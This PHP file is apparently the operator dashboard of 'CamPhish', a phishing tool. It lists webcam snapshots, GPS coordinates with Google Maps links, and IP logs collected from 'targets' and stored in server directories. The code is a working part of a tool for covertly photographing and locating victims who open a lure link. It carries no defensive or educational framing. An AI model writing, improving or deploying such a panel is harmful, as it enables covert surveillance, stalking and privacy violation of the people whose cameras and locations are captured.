<?php
$capturesDir = '/data/captures';
$locationsDir = '/data/locations';
$logsDir = '/data/logs';

$captures = [];
if (is_dir($capturesDir)) {
    foreach (scandir($capturesDir, SCANDIR_SORT_DESCENDING) as $file) {
        if (preg_match('/^cam.*\.png$/i', $file)) {
            $captures[] = [
                'name' => $file,
                'size' => filesize("$capturesDir/$file"),
                'time' => filemtime("$capturesDir/$file"),
                'url' => "/api/capture?file=" . urlencode($file)
            ];
        }
    }
}

$locations = [];
if (is_dir($locationsDir)) {
    foreach (scandir($locationsDir, SCANDIR_SORT_DESCENDING) as $file) {
        if (preg_match('/^location_.*\.txt$/i', $file)) {
            $content = file_get_contents("$locationsDir/$file");
            $lat = $lon = $acc = $maps = '';
            if (preg_match('/Latitude:\s*([^\r\n]+)/', $content, $m)) $lat = trim($m[1]);
            if (preg_match('/Longitude:\s*([^\r\n]+)/', $content, $m)) $lon = trim($m[1]);
            if (preg_match('/Accuracy:\s*([^\r\n]+)/', $content, $m)) $acc = trim($m[1]);
            if (preg_match('/Google Maps:\s*([^\r\n]+)/', $content, $m)) $maps = trim($m[1]);
            $locations[] = [
                'name' => $file,
                'lat' => $lat,
                'lon' => $lon,
                'accuracy' => $acc,
                'maps' => $maps,
                'time' => filemtime("$locationsDir/$file")
            ];
        }
    }
}

$ipLog = '';
$ipFile = "$logsDir/saved.ip.txt";
if (file_exists($ipFile)) {
    $ipLog = htmlspecialchars(file_get_contents($ipFile));
}

$sessionName = getenv('SESSION_NAME') ?: 'default';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CamPhish Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0d1117; color: #c9d1d9; }
        .header { background: #161b22; border-bottom: 1px solid #30363d; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 20px; color: #58a6ff; }
        .header .session { font-size: 13px; color: #8b949e; }
        .container { max-width: 1200px; margin: 0 auto; padding: 24px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
        .stat-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; }
        .stat-card .label { font-size: 12px; color: #8b949e; text-transform: uppercase; }
        .stat-card .value { font-size: 28px; font-weight: 600; color: #58a6ff; margin-top: 4px; }
        .section { margin-bottom: 32px; }
        .section h2 { font-size: 18px; color: #f0f6fc; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid #30363d; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; }
        .card img { width: 100%; height: 200px; object-fit: cover; display: block; }
        .card .info { padding: 12px; }
        .card .info .name { font-size: 13px; color: #c9d1d9; word-break: break-all; }
        .card .info .meta { font-size: 11px; color: #8b949e; margin-top: 4px; }
        .card .info .size { font-size: 11px; color: #8b949e; }
        .location-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; }
        .location-card .coords { font-size: 14px; color: #58a6ff; font-family: monospace; }
        .location-card .maps-link { font-size: 12px; margin-top: 8px; }
        .location-card .maps-link a { color: #3fb950; text-decoration: none; }
        .location-card .maps-link a:hover { text-decoration: underline; }
        .location-card .acc { font-size: 12px; color: #8b949e; margin-top: 4px; }
        .ip-log { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; font-family: monospace; font-size: 12px; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
        .empty { text-align: center; padding: 40px; color: #8b949e; }
        .refresh { background: #238636; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 13px; }
        .refresh:hover { background: #2ea043; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
        .modal.active { display: flex; }
        .modal img { max-width: 90%; max-height: 90%; border-radius: 8px; }
        .modal .close { position: absolute; top: 20px; right: 20px; color: #fff; font-size: 32px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <h1>CamPhish Dashboard</h1>
        <div>
            <span class="session">Session: <?= $sessionName ?></span>
            <button class="refresh" onclick="location.reload()">Refresh</button>
        </div>
    </div>
    <div class="container">
        <div class="stats">
            <div class="stat-card">
                <div class="label">Captures</div>
                <div class="value"><?= count($captures) ?></div>
            </div>
            <div class="stat-card">
                <div class="label">Locations</div>
                <div class="value"><?= count($locations) ?></div>
            </div>
            <div class="stat-card">
                <div class="label">IP Logs</div>
                <div class="value"><?= substr_count($ipLog, "\n") ?></div>
            </div>
        </div>

        <div class="section">
            <h2>Camera Captures</h2>
            <?php if (empty($captures)): ?>
                <div class="empty">No captures yet. Waiting for targets...</div>
            <?php else: ?>
                <div class="grid">
                    <?php foreach ($captures as $cap): ?>
                    <div class="card" onclick="openModal('<?= $cap['url'] ?>')" style="cursor:pointer">
                        <img src="<?= $cap['url'] ?>" alt="<?= $cap['name'] ?>" loading="lazy">
                        <div class="info">
                            <div class="name"><?= htmlspecialchars($cap['name']) ?></div>
                            <div class="meta"><?= date('Y-m-d H:i:s', $cap['time']) ?></div>
                            <div class="size"><?= round($cap['size'] / 1024, 1) ?> KB</div>
                        </div>
                    </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>

        <div class="section">
            <h2>GPS Locations</h2>
            <?php if (empty($locations)): ?>
                <div class="empty">No locations captured yet.</div>
            <?php else: ?>
                <div class="grid">
                    <?php foreach ($locations as $loc): ?>
                    <div class="location-card">
                        <div class="coords"><?= htmlspecialchars($loc['lat']) ?>, <?= htmlspecialchars($loc['lon']) ?></div>
                        <div class="acc">Accuracy: <?= htmlspecialchars($loc['accuracy']) ?></div>
                        <?php if ($loc['maps']): ?>
                        <div class="maps-link"><a href="<?= htmlspecialchars($loc['maps']) ?>" target="_blank">Open in Google Maps →</a></div>
                        <?php endif; ?>
                        <div class="meta" style="margin-top:8px"><?= date('Y-m-d H:i:s', $loc['time']) ?></div>
                    </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>

        <div class="section">
            <h2>IP Log</h2>
            <?php if (empty(trim($ipLog))): ?>
                <div class="empty">No IP logs yet.</div>
            <?php else: ?>
                <div class="ip-log"><?= $ipLog ?></div>
            <?php endif; ?>
        </div>
    </div>

    <div class="modal" id="modal" onclick="closeModal()">
        <span class="close">&times;</span>
        <img id="modal-img" src="" alt="">
    </div>

    <script>
        function openModal(url) {
            document.getElementById('modal-img').src = url;
            document.getElementById('modal').classList.add('active');
        }
        function closeModal() {
            document.getElementById('modal').classList.remove('active');
        }
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') closeModal();
        });
    </script>
</body>
</html>
